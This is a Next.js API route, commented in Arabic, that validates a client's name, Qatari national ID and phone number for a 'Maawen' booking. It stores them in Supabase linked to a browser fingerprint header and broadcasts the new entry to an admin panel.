import { NextRequest, NextResponse } from "next/server";
import { createServiceClient, broadcastNewEntry } from "@/lib/supabase/server";
import { autoUnarchiveOnActivity } from "@/lib/archive";

/**
 * حفظ معلومات عميل "معاون" مع ربطها بالحجز.
 * يُخزَّن إدخال من نوع `maawen_profile` في client_data_entries
 * ويظهر في لوحة الإدارة.
 */
export async function POST(request: NextRequest) {
  const body = await request.json().catch(() => null);
  if (!body) return NextResponse.json({ error: "بيانات غير صالحة" }, { status: 400 });

  const { fullName, national_id, phone, address, bookingRef, booking } = body as {
    fullName?: string;
    national_id?: string;
    phone?: string;
    address?: string;
    bookingRef?: string;
    booking?: Record<string, unknown>;
  };

  const name = String(fullName ?? "").trim();
  const nationalIdClean = String(national_id ?? "").trim();
  const phoneClean = String(phone ?? "").trim();

  if (name.length < 2) {
    return NextResponse.json({ error: "الاسم الكامل مطلوب" }, { status: 422 });
  }
  if (!/^[23][0-9]{10}$/.test(nationalIdClean)) {
    return NextResponse.json({ error: "رقم الهوية القطرية يجب أن يتكون من 11 رقمًا ويبدأ بـ 2 أو 3" }, { status: 422 });
  }
  if (!/^974[0-9]{8}$/.test(phoneClean)) {
    return NextResponse.json({ error: "رقم الجوال يجب أن يكون بصيغة 974 متبوعًا بـ 8 أرقام" }, { status: 422 });
  }
  const storedPhone = `+${phoneClean}`;

  const supabase = createServiceClient();
  const fingerprint = request.headers.get("x-fingerprint") || null;
  let clientId: string | null = null;

  if (fingerprint) {
    const { data: existing } = await supabase
      .from("clients")
      .select("id")
      .eq("fingerprint", fingerprint)
      .maybeSingle();
    if (existing) {
      clientId = existing.id;
      await supabase
        .from("clients")
        .update({ name, phone: storedPhone })
        .eq("id", existing.id);
    } else {
      const { data: created } = await supabase
        .from("clients")
        .insert({ fingerprint, name, phone: storedPhone })
        .select("id")
        .single();
      clientId = created?.id ?? null;
    }
  }

  const { data: entryRow, error: insertErr } = await supabase
    .from("client_data_entries")
    .insert({
      client_id: clientId,
      type: "maawen_profile",
      payload: {
        full_name: name,
        national_id: nationalIdClean,
        phone: storedPhone,
        address: String(address ?? ""),
        booking_ref: bookingRef ?? null,
        booking_summary: (booking as Record<string, unknown>) || null,
        created_at: new Date().toISOString(),
      },
    })
    .select("id")
    .single();

  if (insertErr || !entryRow) {
    return NextResponse.json({ error: "فشل حفظ بيانات العميل" }, { status: 500 });
  }

  await autoUnarchiveOnActivity(clientId);

  void broadcastNewEntry({
    clientId: clientId ?? fingerprint ?? null,
    entryId: entryRow.id,
    type: "maawen_profile",
  });

  return NextResponse.json({ ok: true, bookingRef: bookingRef ?? null });
}